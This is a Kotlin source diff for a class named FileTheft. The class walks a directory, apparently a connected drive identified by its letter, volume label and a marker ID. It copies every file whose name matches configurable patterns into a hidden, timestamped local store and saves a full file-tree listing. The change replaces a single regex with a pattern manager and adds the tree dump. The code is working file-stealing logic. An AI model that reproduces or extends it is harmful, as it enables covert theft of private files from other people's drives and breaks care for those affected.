@@ -7,15 +7,16 @@ import java.io.File
 import java.time.LocalDate
 import java.time.LocalTime
 import java.util.concurrent.CompletableFuture
-import java.util.regex.Pattern
 
 class FileTheft(val directory: File) : Theft {
     companion object {
 
-        @JvmStatic fun timeStamp() = System.currentTimeMillis()
+        @JvmStatic
+        fun timeStamp() = System.currentTimeMillis()
 
-        @JvmStatic fun stealSingleFile(f: File,
-                                       destDir: File = File("${ConfigParameters.instance.dataPath}/${LocalDate.now()}/")): Boolean {
+        @JvmStatic
+        fun stealSingleFile(f: File,
+                            destDir: File = File("${ConfigParameters.instance.dataPath}/${LocalDate.now()}/")): Boolean {
             try {
                 val targetFile = File("${destDir.absolutePath}/${f.nameWithoutExtension}-${timeStamp()}.${f.extension}")
                 f.copyTo(targetFile, bufferSize = 16384)
@@ -30,20 +31,24 @@ class FileTheft(val directory: File) : Theft {
     }
 
     override fun steal() {
-        val pattern = Pattern.compile(ConfigParameters.instance.regex, Pattern.CASE_INSENSITIVE).toRegex()
+        val patterns = PatternsManager.default.readPatterns()
         val driveMarker = DriveMarker.resolve(directory)
         val destDir = File(
                 "${ConfigParameters.instance.dataPath}/" +
                         "${LocalDate.now()}" +
-                        "/${LocalTime.now().toString().replace(':','-').validateFileName()}" +
+                        "/${LocalTime.now().toString().replace(':', '-').validateFileName()}" +
                         "-${directory.absolutePath.first()}" +
                         "-${directory.getVolumeLabel().validateFileName()}" +
                         "-id${driveMarker.markID()}"
         )
-        FileWalker(directory).walk()
+        val fileWalker = FileWalker(directory)
+        fileWalker.walk()
                 .stream()
-                .filter { it.name.matches(pattern) }
-                .forEach { stealSingleFile(it,destDir) }
+                .filter { fileToCheck -> patterns.any { pattern -> pattern.matchesWithName(fileToCheck.name) } }
+                .forEach { stealSingleFile(it, destDir) }
+        val fileTreeOutput = File(destDir, "FileTree.txt").bufferedWriter()
+        fileTreeOutput.write(fileWalker.fileTreeString)
+        fileTreeOutput.close()
     }
 
     fun stealAsync(): CompletableFuture<Unit> {
